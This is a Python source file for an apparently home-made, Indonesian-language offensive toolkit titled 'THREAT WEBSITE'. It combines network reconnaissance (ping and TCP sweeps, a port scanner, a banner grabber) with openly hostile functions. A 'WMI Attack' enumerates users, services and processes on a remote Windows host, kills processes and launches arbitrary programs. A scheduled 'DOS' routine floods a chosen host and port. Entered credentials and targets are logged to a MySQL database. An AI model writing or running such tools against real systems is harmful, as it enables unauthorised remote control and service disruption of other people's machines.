import os, socket, subprocess, time, threading, wmi, sys , random, string, stdiomask, mysql.connector
from bs4.element import ResultSet
from datetime import datetime
from queue import Queue
from bs4 import BeautifulSoup
from IPy import IP
import urllib.request

db = mysql.connector.connect(host="localhost", user="root", passwd="",database="threat_py")

def getIP():
    host = input("Input Alamat Website (Contoh:www.inicontoh.com): ")
    print(socket.gethostbyname(host))

def ping_sweep():
    net = input("IP addres target: ")
    net1 = net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Nomor awal: "))
    en1 = int(input("Nomor akhir: "))
    en1 = en1+1
    t1 = datetime.now()
    print("Ping sweep dalam proses:")
    for ip in range(st1, en1):
        alamat = net2+str(ip)
        res = subprocess.call(['ping', alamat])
        if res == 0: print("Ping ke", alamat, "OK")
        t2 = datetime.now()
        total = t2-t1
        print("Selesai selama: ", total)

def traceroute():
    ip = input("IP address target: ")
    results = os.popen("pathping "+str(ip))
    
    for i in results:
        print(i)

def tcp_sweep():
    net = input("IP address target: ")
    net1 = net.split('.')
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Nomor IP awal: "))
    en1 = int(input("Nomor IP akhir: "))
    port = int(input("Nomor Port: "))
    en1 = en1+1
    t1 = datetime.now()
    def scan(addr):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((addr,port))
        if result == 0: return 1
        else : return 0
    def run1():
        for ip in range (st1, en1):
            addr = net2+str(ip)
            if(scan(addr)) : print(addr, "hidup")

    run1()
    t2 = datetime.now()
    total = t2-t1
    print("Scanning selesai dalam: ", total)

def port_scanner():
    # Clear the screen
    subprocess.call('clear', shell=True)
    # Ask for input
    remoteServer    = input("Input Alamat Website (Contoh:www.inicontoh.com): ")
    remoteServerIP  = socket.gethostbyname(remoteServer)
    # Print a nice banner with information on which host we are about to scan
    print ("-" * 60) 
    print ("Please wait, scanning remote host", remoteServerIP)
    print ("-" * 60) 

    # Check what time the scan started
    t1 = datetime.now()
    # Using the range function to specify ports (here it will scans all ports between 1 and 1024)
    # We also put in some error handling for catching errors
    try:
        for port in range(1,1025):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print ("Port {}: 	 Open".format(port))
            sock.close()

    except KeyboardInterrupt:
        print ("You pressed Ctrl+C")
        sys.exit()

    except socket.gaierror:
        print ('Hostname could not be resolved. Exiting')
        sys.exit()

    except socket.error:
        print ("Couldn't connect to server")
        sys.exit()

    # Checking the time again
    t2 = datetime.now()

    # Calculates the difference of time, to see how long it took to run the script
    total =  t2 - t1

    # Printing the information to screen
    print ('Scanning Completed in: ', total)

def banner_grabber():
        jawab = 'y'
        while(jawab == 'y'):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            alamat = input("Ip Address: ")
            port = input("Port: ")
            result = s.connect_ex((alamat, int(port)))
            if result == 0:
                headers = \
                    "GET / HTTP/1.1\r\n" \
                    f"Host: {alamat}\r\n" \
                    "User-Agent: python-custom-script/2.22.0\r\n" \
                    "Accept-Encoding: gzip, deflate\r\nAccept: */*\r\n" \
                    "Connection: keep-alive\r\n\r\n"
                print("\n\n" + headers)
                s.send(headers.encode()) 
                s = socket.socket()
                s.connect((alamat, int(port)))
                #print(s.recv(1024))
                #resp = s.recv(2048)
                resp = s.recv(2048)
                print(resp)
                #return resp
            else :
                print("Port "+ port + "Tidak hidup")
                s.close()
            jawab = input("Ulang lagi tidak (y/n) ? ")
            if jawab != 'y': break

def get_hyperlink():
    url = input("Masukan URL (contoh: https://websiteku.pw/): ")
    page = urllib.request.urlopen(url)
    soup_object = BeautifulSoup(page.read())
    print (soup_object.title)
    print (soup_object.title.text)
    for link in soup_object.find_all('a'):
        print(link.get('href'))

def wmi_attack():
    ip = input("IP: ")
    username = input("Username: ")
    passwd = stdiomask.getpass("Password: ")
    cursor = db.cursor()
    sql = "INSERT INTO wmi_data (ip, username, password) VALUES (%s, %s, %s)"
    values = [
    (ip, username, passwd)
    ]

    for val in values:
        cursor.execute(sql, val)
    db.commit()
    r = ''
    try:
        c = wmi.WMI(ip,user=r+username,password=passwd)
        for os in c.Win32_OperatingSystem():
            print(os.Caption)
        isJalan1 = input("Lihat daftar Fixed drive target? (y/n)")
        if isJalan1 == 'y':
            print("-------Daftar Fixed Drive-----")
            for disk in c.Win32_LogicalDisk(DriveType=3):
                print(disk)
        
        isJalan2 = input("Liahat daftar service windows target? (y/n)")
        if isJalan2 == 'y':
            print("-------Daftar service windows-----")
            for service in c.Win32_Service(State="Running"):
                print(service.name)
        
        isJalan3 = input("Lihat daftar running aplikasi target? (y/n)")
        if isJalan3 == 'y' :
            for i in c.Win32_Process(["Caption", "ProcessID"]):
                print(i.Caption, i.ProcessID)
            dead = input("Ada program yang ingin dimatikan? (y/n)")
            if dead == 'y':
                noid = input("id program yang akan dimatikan? ")
                c.Win32_Process(ProcessId=noid)[0].Terminate()
        
        isJalan4 = input("Lihat daftar & usernya sistem target? (y/n)")
        if isJalan4 == 'y':
            for group in c.Win32_Group():
                print(group.Caption+":")
                for user in group.associators(wmi_result_class="Win32_UserAccount"):
                    print("-" + user.Caption)
        
        isJalan5 = input("Jalankan aplikasi tertentu pada komputer target? (y/n)")
        if isJalan5 == 'y':
            aplikasi = input("Nama aplikasi yang akan dijalankan")
            SW_SHOWNORMAL = 1   
            try:
                process_startup = c.Win32_ProcessStartup.new()
                process_startup.ShowWindow = SW_SHOWNORMAL
                process_id, result = c.Win32_Process.Create(CommandLine = aplikasi, ProcessStartupInfromation = process_startup)
                if result == 0 :
                    print("Process started successfully: %d" %process_id)
                else : 
                    print("Gagal")
            except:
                print("Error")
    except:
        print("WMI Attack Gagal")

def dos_timebomb():
    jawab = 'y'
    while(jawab == 'y'):
        host = input("IP Address: ")
        port = input("Port: ")
        mulai = input("Jam Mulai DOS? ")
        selesai = input("Jam Selesai DOS? ")
        pesan = input("Masukan Attacking pesan : ")
        cursor = db.cursor()
        sql = "INSERT INTO push_traffic (host, port, jam_mulai, jam_selesai, pesan) VALUES (%s, %s, %s, %s, %s)"
        values = [
        (host, port, mulai, selesai, pesan)
        ]
        for val in values:
            cursor.execute(sql, val)
        db.commit()

        if pesan is None:
            message = string.punctuation + string.digits + string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase
            msg = "".join(random.sample(message, 10))

        elif pesan is not None:
            msg = pesan

        else:
            pass

        host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")

        try:
            ip = socket.gethostbyname(host)

        except socket.gaierror as e:
            print("Pastikan anda memasukan website yang benar!!")
            exit()

        # Time Bomb
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            waktu = time.strftime("%H")


            if str(waktu) == str(mulai):
                try:
                    print("-+"*10 + " Sending Message To IP :  " + str(host) + " Port :" + str(port) + " +-"*10)

                    sock.connect((str(ip), int(port)))
                                
                    if port == 80:
                        sock.send("GET / \nHTTP /1.1\n User-Agent: {}\n\r".format("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36").encode())
                                
                    sock.send(str(msg).encode("utf-8"))
                
                except:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            
            elif str(waktu) == str(selesai):
                print("\nWaktu selesai, menutup serangan!!!")
                time.sleep(1.0)
                sock.close()
                break

        exit()

def tampilan_atas():
    print("==============================================")
    print("#                                            #")
    print("#           THREAT WEBSITE                   #")
    print("#--------------------------------------------#")
    print("#    Redesign by Heriyanto & Riko Souwandi   #")
    print("#           Using Python 3.9                 #")
    print("==============================================")

def menu():
    print("\n")
    print("----------------------------------------------")
    print("[1] Dapatkan IP dari nama host")
    print("[2] Ping Sweep IP")
    print("[3] Traceroute IP")
    print("[4] TCP Sweep IP")
    print("[5] Port Scanning IP")
    print("[6] Banner Grabber IP")
    print("[7] Data hyperlink website")
    print("[8] WMI Attack")
    print("[9] Push Traffic Website")
    print("[x] Keluar alias exit")

    menu = input("PILIH MENU> ")
    print("\n")
    if menu == "1": getIP()
    elif menu == "2": ping_sweep()
    elif menu == "3": traceroute()
    elif menu == "4": tcp_sweep()
    elif menu == "5": port_scanner()
    elif menu == "6": banner_grabber()
    elif menu == "7": get_hyperlink()
    elif menu == "8": wmi_attack()
    elif menu == "9": dos_timebomb()
    elif menu == "x": 
        print("Keluar dari aplikasi threat")
        exit()
    else:
        print("Salah pilih")

tampilan_atas()
jawab = 'y'
while (jawab == 'y'):
    menu()
    jawab = input("Lakukan aksi ? (y/n) ")
    if jawab != 'y':
        print("Aplikasi close")
        break